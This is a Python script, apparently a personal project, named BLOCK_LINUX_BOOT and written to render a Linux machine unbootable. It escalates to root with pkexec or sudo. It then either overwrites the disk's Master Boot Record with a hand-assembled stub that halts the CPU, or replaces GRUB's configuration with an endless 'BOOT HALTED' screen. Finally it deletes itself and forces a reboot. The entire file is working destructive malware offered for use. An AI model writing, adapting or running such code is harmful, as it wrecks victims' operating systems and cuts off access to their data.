# CREATOR 
# GitHub https://github.com/cppandpython
# NAME: Vladislav 
# SURNAME: Khudash  
# AGE: 17

# DATE: 09.02.2026
# APP: BLOCK_LINUX_BOOT
# TYPE: BLOCK_OS
# VERSION: LATEST
# PLATFORM: linux




MSG = '[ LINBOOT ]\nBOOT HALTED'




import os
from subprocess import run as sp_run
from sys import exit as _exit, platform, executable


if platform != 'linux':
    print(f'DO NOT SUPPORT ({platform})')
    _exit(1)


IS_ROOT = os.getuid() == 0
IS_UEFI = os.path.exists('/sys/firmware/efi')
BOOT_EFI = '/boot/efi/EFI'
UEFI_GRUB = 'grub.cfg'
BOOT_GRUB = '/boot/grub/grub.cfg'
PROC_MOUNTS = '/proc/mounts'
SYS_DISK = '/sys/block'
REBOOT = '/usr/sbin/reboot'
SUDO = '/usr/bin/pkexec' if (os.environ.get('DISPLAY', False) 
    or os.environ.get('WAYLAND_DISPLAY', False)) else '/usr/bin/sudo'


def cmd(c):
    try:
        return sp_run(c, capture_output=True, text=True).stdout
    except:
        return None


def grub_cfg():
    cfg = [
        'set default=0', 
        'set timeout=0\n', 
        'menuentry "linboot" {', 
        '    clear'
    ]

    for n in MSG.splitlines():
        n = n.replace('"', '\\"')
        cfg.append(f'    echo "{n}"')

    cfg.extend(['    sleep 999999', '}'])

    return '\n'.join(cfg)


def make_mbr():
    '''
Returns a 16-bit Master Boot Record (MBR) binary.

This MBR was assembled using NASM from the following source:


BITS 16
ORG 0x7C00


start:
    cli
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00
    sti
    mov si, msg


output:
    lodsb
    cmp al, 0
    je loop
    mov ah, 0x0E
    mov bh, 0x00
    int 0x10
    jmp output


loop:
    cli
    hlt


msg db 'here is (MSG)', 0
dw 0xAA55
    '''

    template = b'\xfa1\xc0\x8e\xd8\x8e\xc0\x8e\xd0\xbc\x00|\xfb\xbe\x1f|\xac<\x00t\x08\xb4\x0e\xb7\x00\xcd\x10\xeb\xf3\xfa\xf4'
    
    template_len = len(template)
    msg_len = len(MSG)
    
    mbr = bytearray(512)
    ptr = memoryview(mbr)

    ptr[0:template_len] = template
    ptr[template_len:template_len + msg_len] = MSG
    ptr[template_len + msg_len] = 0
    ptr[510] = 0x55
    ptr[511] = 0xAA

    return bytes(ptr)


def disk_bios():
    if not (os.path.isdir(PROC_MOUNTS) or os.path.isdir(SYS_DISK)):
        return None
    
    with open(PROC_MOUNTS, 'r') as f:
        for line in f:
            n = line.split()

            if (len(n) < 2) or not n[0].startswith('/dev/') or (n[1] != '/'):
                continue

            root_disk = n[0]
            break
        else:
            return None
   
    for n in os.listdir(SYS_DISK):
        if n not in root_disk:
            continue

        name = f'/dev/{n}'

        try:
            with open(name, 'rb') as f:
                sector = f.read(512)

                if (len(sector) == 512) and (sector[510:512] == b'\x55\xaa'):
                    return name
        except:
            break

    return None


def BIOS():
    mbr = make_mbr()
    disk = disk_bios()

    if disk is None:
        DEFAULT()
        return

    try:
        with open(disk, 'wb') as f:  
            f.write(mbr)                    
            f.flush()                       
            os.fsync(f.fileno())    

        os.sync()  
    except:
        DEFAULT()


def UEFI():
    cfg = grub_cfg()

    for droot, _, files in os.walk(BOOT_EFI):
        if UEFI_GRUB not in files:
            continue

        with open(os.path.join(droot, UEFI_GRUB), 'w') as f:
            f.write(cfg)
            
        return
        
    DEFAULT(cfg)
    

def DEFAULT(cfg=None):
    cfg = cfg or grub_cfg()

    if not os.path.isfile(BOOT_GRUB):
        _exit(-1)

    with open(BOOT_GRUB, 'w') as f:
        f.write(cfg)


def main():
    global MSG

    if not isinstance(MSG, str):
        raise TypeError('(MSG) must be str')
    
    if not IS_UEFI:
        try:
            MSG = MSG.encode('ASCII')
        except UnicodeEncodeError:
            raise ValueError(f'(MSG) must be ASCII')

        if len(MSG) > 478:
            raise OverflowError('(MSG) length > 478')
    
    not IS_ROOT and os.execv(SUDO, [SUDO, executable, __file__])

    (UEFI if IS_UEFI else BIOS)()
    
    if os.path.isfile(__file__): os.remove(__file__)
    sp_run([REBOOT])
    _exit(0)


if __name__ == '__main__': main()